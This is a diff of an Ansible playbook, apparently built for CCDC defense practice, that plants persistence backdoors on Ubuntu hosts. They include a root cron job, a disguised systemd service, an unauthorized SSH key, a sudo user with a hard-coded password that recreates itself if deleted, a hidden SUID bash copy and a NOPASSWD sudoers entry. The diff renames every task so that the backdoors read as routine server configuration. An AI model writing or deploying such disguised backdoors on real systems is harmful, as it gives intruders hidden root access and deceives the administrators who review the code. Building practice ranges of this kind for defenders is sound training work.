@@ -1,6 +1,6 @@
 ---
 # DO NOT READ THIS FILE BEFORE ATTEMPTING THE CHALLENGE
-- name: Plant persistence mechanisms for CCDC practice
+- name: Configure Ubuntu application server
   hosts: all
   become: yes
   tasks:
@@ -20,7 +20,7 @@
         enabled: yes
 
     # --- 1. Unauthorized root cron job ---
-    - name: Plant unauthorized root cron job
+    - name: Configure root cron job
       cron:
         name: "system cache sync"
         user: root
@@ -28,7 +28,7 @@
         job: "/usr/bin/id >> /tmp/.svc-cache 2>&1"
 
     # --- 2. Rogue systemd service, disguised name, enabled at boot ---
-    - name: Drop rogue service payload script
+    - name: Deploy systemd-networkd-helper script
       copy:
         dest: /usr/local/lib/systemd-networkd-helper.sh
         mode: "0755"
@@ -39,7 +39,7 @@
               sleep 5
           done
 
-    - name: Install rogue systemd unit
+    - name: Install systemd-networkd-helper unit
       copy:
         dest: /etc/systemd/system/systemd-networkd-helper.service
         mode: "0644"
@@ -54,7 +54,7 @@
           [Install]
           WantedBy=multi-user.target
 
-    - name: Enable and start rogue systemd service
+    - name: Enable and start systemd-networkd-helper
       systemd:
         name: systemd-networkd-helper.service
         daemon_reload: yes
@@ -70,7 +70,7 @@
         group: vagrant
         mode: "0700"
 
-    - name: Plant unauthorized SSH key for vagrant user
+    - name: Configure vagrant user's authorized_keys
       lineinfile:
         path: /home/vagrant/.ssh/authorized_keys
         line: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxL3Y8tRk2qQeW1JmzVvKZ0aB7cD4eF6gH8iJ0kL2mN svc-maint@corp"
@@ -80,17 +80,17 @@
         mode: "0600"
 
     # --- 4. Self-healing rogue user ---
-    - name: Create the backdoor account (already present at the start of the challenge)
+    - name: Create svc-tools account
       user:
         name: svc-tools
         shell: /bin/bash
         groups: sudo
         append: yes
 
-    - name: Set backdoor account password
+    - name: Set svc-tools account password
       shell: echo "svc-tools:C4che!2024" | chpasswd
 
-    - name: Plant self-healing profile.d script that recreates svc-tools if deleted
+    - name: Install profile.d cache-check script
       copy:
         dest: /etc/profile.d/99-cache-check.sh
         mode: "0755"
@@ -102,7 +102,7 @@
           fi
 
     # --- 5. SUID-root shell backdoor ---
-    - name: Plant SUID-root shell binary
+    - name: Install sysbash utility
       copy:
         src: /bin/bash
         dest: /usr/local/bin/.sysbash
@@ -117,7 +117,7 @@
         name: reports
         shell: /bin/bash
 
-    - name: Grant unauthorized NOPASSWD sudo to reports
+    - name: Configure reports sudoers entry
       copy:
         dest: /etc/sudoers.d/90-reports
         mode: "0440"
